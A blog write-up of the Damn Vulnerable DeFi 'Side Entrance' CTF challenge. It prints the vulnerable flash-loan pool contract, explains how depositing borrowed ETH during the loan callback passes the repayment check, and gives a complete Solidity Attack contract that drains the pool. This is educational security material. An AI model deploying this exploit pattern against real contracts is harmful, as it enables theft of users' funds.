---
layout: post
title: "Side Entrance — Damn Vulnerable DeFi Writeup"
date: 2026-10-06 11:00:00 +0530
description: "Writeup for Side entrance challenge from Damn Vulnerable Defi."
categories: [Writeups, CTF, Web3 Security]
tags: [ctf, web3, solidity, defi, flashloan]
author: Sarayu
toc: true
---

Let us look at the source code.

```javascript
// SPDX-License-Identifier: MIT

// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)

pragma solidity =0.8.25;

import { SafeTransferLib } from "solady/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }

        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        delete balances[msg.sender];

        emit Withdraw(msg.sender, amount);
        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{ value: amount }();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}
```

A key point to notice is that the flashLoan() lets us call our own execute() function from our attacker contract. it simply checks whether the amount has been returned to the pool contract or not.

```javascript
 function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{ value: amount }();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```

we can implement an attack contract with an execute() function of our own.

Note that flashLoan() takes the parameter of the type uint256, lets the user to borrow some amount of eth using the execute() function.

and deposit() takes up msg.value as the amount which gets deposited.

now, what if we use the flashLoan()'s execute() function to call the deposit() function ?

Simply put, how much ever eth we are borrowing from the contract using the flashLoan() function, we are depositing it back into the contract, and once execute() is done, the internal balances are updated and the pool's balance is increased, hence bypassing the balanceBefore check.

now we can call the withdraw() function and drain the entire balance of the pool.

> **Flow**
> {: .prompt-info }
>
> ```text
> Pool has 100 ETH
> ↓
> flashLoan(10 ETH)
> ↓
> balanceBefore = 100 ETH
> ↓
> Pool sends 10 ETH → attacker.execute()
> ↓
> Pool now has 90 ETH
> ↓
> attacker.execute() deposits 10 ETH back
> ↓
> Pool now has 100 ETH
> ↓
> balance >= balanceBefore
> ```

rough idea:

```text
exec(){
    pool.deposit()
}

exploit(){
    pool.flashLoan() amt // calls
    pool.withdraw()
}

recieve(){} // for the contract to be able to receive eth
```

so, our final exploit will be:

```javascript
function test_sideEntrance() public checkSolvedByPlayer {
Attack exp = new Attack(pool, recovery);
exp.attack(1000000000000000000000);
exp.transfer();
}

```

Attack Contract:

```javascript
contract Attack {
    SideEntranceLenderPool public immutable pool;
    address payable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = payable(_recovery);
    }

    function execute() external payable {
        uint256 amount = msg.value;
        pool.deposit{value: amount}();
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
    }

    function transfer() external {
        (bool success, ) = recovery.call{
            value: address(this).balance
        }(
            abi.encodeWithSignature("doesNotExist()")
        );

        require(success, "Transfer failed");
    }

    receive() external payable {}
}
```

![image.png](/assets/img/posts/side-entrance/image.png)